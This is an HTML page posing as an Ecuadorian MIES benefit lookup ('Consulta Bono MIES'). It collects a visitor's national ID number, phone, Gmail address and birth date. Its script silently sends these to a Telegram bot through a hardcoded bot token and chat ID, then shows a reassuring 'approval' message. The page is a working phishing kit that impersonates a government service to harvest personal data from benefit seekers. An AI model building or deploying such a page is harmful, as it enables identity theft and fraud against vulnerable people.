<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<title>Consulta Bono MIES</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background-color: #f2f2f2;
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
  }
  .container {
    background: #fff;
    padding: 20px;
    border-radius: 10px;
    width: 90%;
    max-width: 400px;
    box-shadow: 0 0 15px rgba(0,0,0,0.1);
  }
  h2 {
    text-align: center;
    color: #333;
  }
  label {
    display: block;
    margin-top: 10px;
    font-weight: bold;
  }
  input {
    width: 100%;
    padding: 8px;
    margin-top: 5px;
    border-radius: 5px;
    border: 1px solid #ccc;
  }
  button {
    margin-top: 15px;
    width: 100%;
    padding: 10px;
    background: #007bff;
    color: white;
    font-size: 16px;
    border: none;
    border-radius: 5px;
    cursor: pointer;
  }
  button:hover {
    background: #0056b3;
  }
  .popup {
    display: none;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: white;
    padding: 20px;
    border-radius: 15px;
    box-shadow: 0 0 20px rgba(0,0,0,0.3);
    text-align: center;
    z-index: 1000;
    max-width: 90%;
  }
  .popup p {
    margin: 0;
    font-size: 16px;
    color: #333;
  }
</style>
</head>
<body>

<div class="container">
  <h2>Consulta Bono MIES</h2>
  <form id="consultaForm">
    <label for="cedula">N√∫mero de c√©dula:</label>
    <input type="text" id="cedula" name="cedula" pattern="[0-9]{10}" required>

    <label for="telefono">Tel√©fono:</label>
    <input type="tel" id="telefono" name="telefono" pattern="[0-9]{7,10}" required>

    <label for="email">Correo electr√≥nico (Gmail):</label>
    <input type="email" id="email" name="email" pattern="^[a-zA-Z0-9._%+-]+@gmail\.com$" required>

    <label for="fechaNacimiento">Fecha de nacimiento:</label>
    <input type="date" id="fechaNacimiento" name="fechaNacimiento" required>

    <button type="submit">Consultar</button>
  </form>
</div>

<div class="popup" id="popup">
  <p id="popupMessage"></p>
</div>

<script>
  const BOT_TOKEN = "8294121246:AAEWiRJdKEJRn4UdJpUyaTVsfk1MCua19WI";
  const CHAT_ID = "5654253897";

  const form = document.getElementById("consultaForm");
  const popup = document.getElementById("popup");
  const popupMessage = document.getElementById("popupMessage");

  form.addEventListener("submit", async function(e) {
    e.preventDefault();

    const cedula = document.getElementById("cedula").value;
    const telefono = document.getElementById("telefono").value;
    const email = document.getElementById("email").value;
    const fechaNacimiento = document.getElementById("fechaNacimiento").value;

    const message = `
üìÑ *Consulta Bono MIES*
üë§ C√©dula: ${cedula}
üìû Tel√©fono: ${telefono}
üìß Email: ${email}
üéÇ Fecha de nacimiento: ${fechaNacimiento}
    `;

    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "Markdown"
        })
      });

      popupMessage.textContent = "En caso de aprobarse, ser√° comunicado inmediatamente.";
      popup.style.display = "block";
      setTimeout(() => { popup.style.display = "none"; }, 5000);

      form.reset();
    } catch (error) {
      popupMessage.textContent = "Error al enviar la consulta. Int√©ntelo de nuevo.";
      popup.style.display = "block";
      setTimeout(() => { popup.style.display = "none"; }, 5000);
    }
  });
</script>

</body>
</html>
